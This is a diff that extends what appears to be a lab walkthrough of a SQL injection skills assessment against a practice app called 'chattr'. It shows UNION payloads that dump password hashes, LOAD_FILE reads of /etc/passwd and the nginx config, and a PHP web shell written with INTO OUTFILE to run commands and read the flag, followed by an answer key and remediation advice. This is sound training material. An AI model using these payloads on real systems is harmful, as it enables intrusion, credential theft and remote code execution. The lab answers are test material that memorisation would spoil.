@@ -4203,9 +4203,346 @@ word') union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where tabl
 
 - URL: `https://<TARGET>/index.php?q=word%27%29+union+select+1%2C2%2CCOLUMN_NAME%2C4+from+INFORMATION_SCHEMA.COLUMNS+where+table_name%3D%27Users%27--+-&u=1`
 
-_Output captured in the next step, where we use the column names to dump the credentials._
+The reflected output lists the table's columns (each printed next to the literal `4` from the fourth column):
+
+<table width="100%">
+<tr><td> 🖥️ <b>chattr — reflected output</b> </td></tr>
+<tr><td>
+
+```text
+UserID
+Username
+Password
+InvitationCode
+AccountCreated
+```
+
+</td></tr>
+</table>
+
+The `Users` table exposes exactly what we need: **`Username`** and **`Password`**, alongside `UserID`, `InvitationCode`, and `AccountCreated`. That is enough to dump every account's credentials in the next step.
 
 </details>
+
+</details>
+
+<details>
+<summary><h3>🔑 Step 6 - Dumping Credentials</h3></summary>
+
+We place `Username` and `Password` into the two reflected columns (3 and 4) and read them straight from `Users`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+word') union select 1,2,Username,Password from Users-- -
+```
+
+</td></tr>
+</table>
+
+- URL: `https://<TARGET>/index.php?q=word%27%29+union+select+1%2C2%2CUsername%2CPassword+from+Users--+-&u=1`
+
+The page returns every account paired with its stored password (column 3 = `Username`, column 4 = `Password`):
+
+| Username | Password (Argon2i hash) |
+|---|---|
+| `admin` | `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU` |
+| `bmdyy` | `$argon2i$v=19$m=2048,t=4,p=3$UDhiSFgvTU0uZjBNUGljbw$FAraZTOEEidUQJXHmCkgH08iIuYZP/MQpLg+bBcM5o4` |
+| `dev` | `$argon2i$v=19$m=2048,t=4,p=3$TGxqYzFCemxBL3dFSkNwRQ$MQ6sZ+WbyTC2YY3GMGhsSXDhg7+oGWoOGvG8caw47Nc` |
+| `chattr` | `$argon2i$v=19$m=2048,t=4,p=3$UzY3d1FGclBNQThCTTBmUw$wbFe74g6vSKuTGXnL4eBeNSeKS+9kya/OMJRS1Gfs50` |
+| `htb` | `$argon2i$v=19$m=2048,t=4,p=3$R2xlRmhPVkZqZlJzam51NQ$D9Afk205wKJyihmT7KnMTi7OLiR5ZUhrp+YFvefPD50` |
+
+We now hold the full credential set, including **`admin`**'s. Two things stand out:
+
+- The passwords are **not cleartext** — the application stores them **hashed with Argon2i** (`$argon2i$v=19$...`), which is exactly the good practice the module recommended earlier. Reading the table gives us the hash, not the password.
+- Our own account, **`htb`**, appears in the dump too — confirming it is the session user we have been operating as.
+
+> **NOTE:** **Argon2i** is a memory-hard key-derivation function (winner of the Password Hashing Competition), deliberately expensive in memory and time to defeat GPU/ASIC cracking. Offline cracking is therefore **impractical** unless a password is weak enough to appear in a wordlist. A well-defended password store like this pushes us to look for **another path** rather than cracking hashes — for example, reading files on the server with `LOAD_FILE`, writing a web shell via `INTO OUTFILE` (privileges permitting), or inspecting the remaining `InvitationCodes` and `Messages` tables for where the target flag actually lives.
+
+</details>
+
+<details>
+<summary><h3>🪪 Step 7 - Identifying the DB User & Its Privileges</h3></summary>
+
+The Argon2i hashes cannot be used to log in and are not worth cracking — but they are still a **significant finding to report**. With credential reuse off the table, the strategy shifts: instead of *reading* data, we investigate **who** the database user running our queries is and **what it is allowed to do**. A user with the `FILE` privilege opens the door to reading server files (`LOAD_FILE`) or writing a web shell (`INTO OUTFILE`).
+
+First, we identify the current DB user with `user()`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+word') union select 1,2,user(),4 from INFORMATION_SCHEMA.SCHEMATA-- -
+```
+
+</td></tr>
+</table>
+
+- URL: `https://<TARGET>/index.php?q=word%27%29+union+select+1%2C2%2C+user%28%29%2C4+from+INFORMATION_SCHEMA.SCHEMATA--+-&u=1`
+
+<table width="100%">
+<tr><td> 🖥️ <b>chattr — reflected output</b> </td></tr>
+<tr><td>
+
+```text
+chattr_dbUser@localhost
+```
+
+</td></tr>
+</table>
+
+The application connects as **`chattr_dbUser@localhost`** — a **dedicated, non-root account**, which is itself good practice (least privilege). Whether it was granted `FILE` anyway is the next question, so we enumerate its privileges from `INFORMATION_SCHEMA.USER_PRIVILEGES`, putting the grantee and each privilege into the reflected columns:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+word') union select 1,2,grantee,privilege_type from INFORMATION_SCHEMA.USER_PRIVILEGES-- -
+```
+
+</td></tr>
+</table>
+
+- URL: `https://<TARGET>/index.php?q=word%27%29+union+select+1%2C2%2Cgrantee%2Cprivilege_type+from+INFORMATION_SCHEMA.USER_PRIVILEGES--+-&u=1`
+
+The reflected output returns the grantee and the critical privilege:
+
+| Grantee | Privilege |
+|---|---|
+| `'chattr_dbUser'@'localhost'` | `FILE` |
+
+This is the break we needed. Despite being a non-root account, `chattr_dbUser` was granted the **`FILE`** privilege — a dangerous over-grant that unlocks filesystem access from within the injection:
+
+- **`LOAD_FILE('/path')`** — read arbitrary files the OS user can access (config files, the flag, `/etc/passwd`, source code).
+- **`... INTO OUTFILE '/path'`** — write files (e.g. a PHP web shell into the web root for RCE), subject to `secure_file_priv` and write permissions.
+
+> **NOTE:** `FILE` is exactly the privilege the module's mitigation chapter warns about — an application DB user should almost never hold it. Its presence here turns a data-disclosure bug into potential **file read and remote code execution**.
+
+The next step is to confirm where file operations are allowed (`secure_file_priv`) and then read the target flag with `LOAD_FILE`.
+
+</details>
+
+<details>
+<summary><h3>📂 Step 8 - Reading Files with LOAD_FILE</h3></summary>
+
+The `FILE` privilege is only half the story — MySQL/MariaDB also gates file operations behind the **`secure_file_priv`** system variable. We read it from `INFORMATION_SCHEMA.GLOBAL_VARIABLES`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+word') union select 1,2,variable_name,variable_value from INFORMATION_SCHEMA.GLOBAL_VARIABLES where variable_name='secure_file_priv'-- -
+```
+
+</td></tr>
+</table>
+
+- URL: `https://<TARGET>/index.php?q=word%27%29+union+select+1%2C2%2Cvariable_name%2Cvariable_value+from+INFORMATION_SCHEMA.GLOBAL_VARIABLES+where+variable_name%3D%27secure_file_priv%27--+-&u=1`
+
+<table width="100%">
+<tr><td> 🖥️ <b>chattr — reflected output</b> </td></tr>
+<tr><td>
+
+| Variable | Value |
+|---|---|
+| `secure_file_priv` | *(empty)* |
+
+</td></tr>
+</table>
+
+The variable is **empty** — the strongest possible outcome for us. An empty `secure_file_priv` means file read/write is **not restricted to any directory**, so `LOAD_FILE` can read anywhere the `mysql` OS user is permitted.
+
+We confirm arbitrary file read by pulling a classic target, `/etc/passwd`, into the reflected column:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+word') union select 1,2,LOAD_FILE('/etc/passwd'),4-- -
+```
+
+</td></tr>
+</table>
+
+- URL: `https://<TARGET>/index.php?q=word%27%29+union+select+1%2C2%2CLOAD_FILE%28%27%2Fetc%2Fpasswd%27%29%2C4--+-&u=1`
+
+<table width="100%">
+<tr><td> 🖥️ <b>chattr — reflected output (/etc/passwd)</b> </td></tr>
+<tr><td>
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+<SNIP>
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+<SNIP>
+mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+<SNIP>
+```
+
+</td></tr>
+</table>
+
+The read succeeds — **arbitrary file read is confirmed**. Two useful facts fall out of `/etc/passwd`:
+
+- **`www-data`**'s home is **`/var/www`** — a *hint* at where the web files live, but **not** proof of the document root (see the note below).
+- The DB runs as **`mysql`**, whose file access defines what `LOAD_FILE` can reach.
+
+> **NOTE:** `LOAD_FILE` returns `NULL` (a blank reflected value) when the file does not exist **or** when the `mysql` OS user cannot read it — a blank result is not proof the file is absent, only that it could not be read.
+
+<details>
+<summary><h4>Finding the Real Web Root — Home ≠ Document Root</h4></summary>
+
+A tempting mistake here is to assume the web root is **`/var/www`**, because that is `www-data`'s home directory in `/etc/passwd`. It is not: the sixth field of a `/etc/passwd` line is the account's **home directory**, while the **document root** — the folder the web server actually serves files from — is defined in the **web server's configuration**, and the two are frequently different.
+
+To find the document root for certain, we identify the web server and read its config. The `Server` response header (visible in Burp's **Repeater** or **HTTP history** — not the browser) identifies it:
+
+<table width="100%">
+<tr><td> 🕸️ <b>Burp Suite — Response header</b> </td></tr>
+<tr><td>
+
+```http
+HTTP/1.1 200 OK
+Server: nginx/1.22.1
+```
+
+</td></tr>
+</table>
+
+It is **nginx**, so we read its enabled site config with `LOAD_FILE`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+word') union select 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4-- -
+```
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td> 🖥️ <b>chattr — reflected output (nginx config)</b> </td></tr>
+<tr><td>
+
+```nginx
+server {
+    listen 443 ssl;
+    server_name chattr.htb;
+    ssl_password_file /root/chattr.key.pass;
+    ssl_certificate /etc/ssl/certs/chattr.crt;
+    ssl_certificate_key /etc/ssl/private/chattr.key;
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_ciphers HIGH:!aNULL:!MD5;
+    root /var/www/chattr-prod;
+    location / {
+        index index.php;
+        try_files $uri $uri/ /index.php?$query_string;
+    }
+    location ~ \.php$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/run/php/php8.2-fpm.sock;
+    }
+    location ^~ /includes/ { deny all; }
+}
+```
+
+</td></tr>
+</table>
+
+The `root` directive settles it — the real document root is **`/var/www/chattr-prod`**, *not* `/var/www`. The same config hands us several facts that shape the next step:
+
+| Directive | Value | Why it matters |
+|---|---|---|
+| `root` | `/var/www/chattr-prod` | The document root — where a web shell must be written to be reachable over HTTP |
+| `location ~ \.php$` → `fastcgi_pass` | `php8.2-fpm` | `.php` files are **executed** by PHP-FPM → a `.php` we write will run |
+| `server_name` | `chattr.htb` | The virtual host name |
+| `location ^~ /includes/` | `deny all` | The `/includes/` path is blocked — avoid writing a shell there |
+
+> **NOTE:** This is why `/var/www` was rejected as the web-root answer: it is the OS home of `www-data`, whereas the document root is whatever the server's `root` (nginx) or `DocumentRoot` (Apache) directive points to — here **`/var/www/chattr-prod`**.
+
+With the true document root known — and `.php` confirmed to execute via PHP-FPM — we have everything needed to escalate from **file read** to **remote code execution**: write a PHP web shell into `/var/www/chattr-prod` with `INTO OUTFILE`, then call it over HTTP to read the flag.
+
+</details>
+
+</details>
+
+<details>
+<summary><h3>🐚 Step 9 - Remote Code Execution & Reading the Flag</h3></summary>
+
+We reuse the same injection, but instead of reading a file we **write** one — a minimal PHP web shell dropped straight into the document root with `INTO OUTFILE`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+word') union select 1,2,'<?php system($_REQUEST[0]); ?>',4 into outfile '/var/www/chattr-prod/shell.php'-- -
+```
+
+</td></tr>
+</table>
+
+- URL: `https://<TARGET>/index.php?q=word%27%29+union+select+1%2C2%2C%27%3C%3Fphp+system%28%24_REQUEST%5B0%5D%29%3B+%3F%3E%27%2C4+into+outfile+%27%2Fvar%2Fwww%2Fchattr-prod%2Fshell.php%27--+-&u=1`
+
+Sending it returns the page **without the conversation box** — the same "query executed" signal from our oracle, indicating the write succeeded. Now we invoke the shell over HTTP, passing the command in the `0` parameter (`system($_REQUEST[0])`):
+
+- URL: `https://<TARGET>/shell.php?0=id`
+
+<table width="100%">
+<tr><td> 🖥️ <b>chattr — shell.php output</b> </td></tr>
+<tr><td>
+
+```text
+1	2	uid=33(www-data) gid=33(www-data) groups=33(www-data)	4
+```
+
+</td></tr>
+</table>
+
+**Remote code execution confirmed** — commands run as **`www-data`**. We have gone from a search box to arbitrary command execution on the server.
+
+> **NOTE:** The stray `1`, `2`, and `4` around the output are cosmetic. `INTO OUTFILE` writes the **entire selected row**, tab-separated, so `shell.php` literally contains `1⇥2⇥<?php system($_REQUEST[0]); ?>⇥4`. Only column 3 is PHP and gets executed; the padding columns render as plain text on either side of the command output. It does not affect the shell — but selecting `NULL`s or writing only the payload column would produce a cleaner file.
+
+With a working shell, we locate the flag — its name is randomised (`/flag_XXXXXX.txt`), so we list `/` to find it:
+
+- URL: `https://<TARGET>/shell.php?0=ls%20/`
+
+<table width="100%">
+<tr><td> 🖥️ <b>chattr — shell.php output (ls /)</b> </td></tr>
+<tr><td>
+
+```text
+1	2	bin boot dev etc flag_876a4c.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var	4
+```
+
+</td></tr>
+</table>
+
+The flag is at the filesystem root: **`/flag_876a4c.txt`**. We read it with `cat`:
+
+- URL: `https://<TARGET>/shell.php?0=cat%20/flag_876a4c.txt`
+
+<table width="100%">
+<tr><td> 🖥️ <b>chattr — flag</b> </td></tr>
+<tr><td>
+
+```text
+1	2	061b1aeb94dec6bf5d9c27032b3c1d8d	4
+```
+
+</td></tr>
+</table>
+
+🏁 The flag is **`061b1aeb94dec6bf5d9c27032b3c1d8d`** — the assessment is complete. A single injectable search box has been walked all the way to **remote code execution** and full read access to the server's filesystem.
 
 </details>
 
@@ -4214,7 +4551,55 @@ _Output captured in the next step, where we use the column names to dump the cre
 <details>
 <summary><h2>📝 Summary</h2></summary>
 
-_To be completed once the walkthrough is finished._
+Starting from nothing but an IP address, a single injectable parameter was chained all the way to **remote code execution** and full filesystem read on the server.
+
+**The attack chain**
+
+```mermaid
+flowchart TD
+    A["🔍 Recon<br/>login.php not injectable"] --> B["🔓 Registration bypass<br/>' or '1'='1 in invitationCode"]
+    B --> C["🔎 Injectable search box<br/>index.php?q= (in-band)"]
+    C --> D["🧩 Boundary + columns<br/>') -- - · UNION = 4 cols (3,4 shown)"]
+    D --> E["🗃️ DB enumeration<br/>chattr → Users → creds"]
+    E --> F["🪪 DB user privileges<br/>chattr_dbUser has FILE"]
+    F --> G["📂 Arbitrary file read<br/>secure_file_priv empty · LOAD_FILE"]
+    G --> H["🌐 Real web root<br/>nginx root = /var/www/chattr-prod"]
+    H --> I["🐚 RCE<br/>INTO OUTFILE web shell → flag"]
+
+    style A fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style B fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style C fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style D fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style E fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style F fill:#8b3a3a,stroke:#ff6b6b,stroke-width:2px,color:#fff
+    style G fill:#8b3a3a,stroke:#ff6b6b,stroke-width:2px,color:#fff
+    style H fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style I fill:#2a6a4a,stroke:#32cd32,stroke-width:3px,color:#fff
+```
+
+1. **Recon** — the login form resisted every escape character (parameterized), so the surface was widened to registration.
+2. **Registration bypass** — the invitation-code check was concatenated, not parameterized; `' or '1'='1` made it always-true and granted an account. *(Defenses are per-query, not per-application.)*
+3. **Injectable search** — the message search parameter `q` altered the page when fed a `'` — an in-band injection point.
+4. **Boundary & column discovery** — guided only by a blank-vs-renders oracle, the context was escaped (`') -- -`) and the column count found (4, with columns 3 and 4 reflected).
+5. **Database enumeration** — `chattr` DB → `Users` table → all credentials, stored as strong **Argon2i** hashes (not crackable, so no reuse path).
+6. **Privilege check** — the app's DB user `chattr_dbUser` was over-granted the **`FILE`** privilege.
+7. **File read** — `secure_file_priv` was empty, so `LOAD_FILE` read arbitrary files; the nginx config revealed the true document root **`/var/www/chattr-prod`** and PHP-FPM execution.
+8. **RCE** — a PHP web shell was written into the document root with `INTO OUTFILE`, giving command execution as `www-data` and the flag.
+
+**Answers**
+
+| # | Question | Answer |
+|---|---|---|
+| 1 | Password hash for `admin` | `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU` |
+| 2 | Root path of the web application | `/var/www/chattr-prod` |
+| 3 | Contents of `/flag_876a4c.txt` | `061b1aeb94dec6bf5d9c27032b3c1d8d` |
+
+**Root causes & recommendations (for the client report)**
+
+- **Inconsistent query construction** — the login used prepared statements, but the invitation-code check and the message search concatenated user input. **Parameterize every query**, without exception.
+- **Excessive DB privileges** — the application account held `FILE`. **Revoke `FILE`** from application users; it is almost never needed.
+- **Unrestricted file operations** — `secure_file_priv` was empty. **Set `secure_file_priv`** to a directory the DB never needs to write into the web root from.
+- **Defense in depth** — strong Argon2i password hashing was the one thing done right and it paid off (credentials survived disclosure). The same rigour applied to queries and privileges would have stopped the chain at step 3.
 
 </details>
 
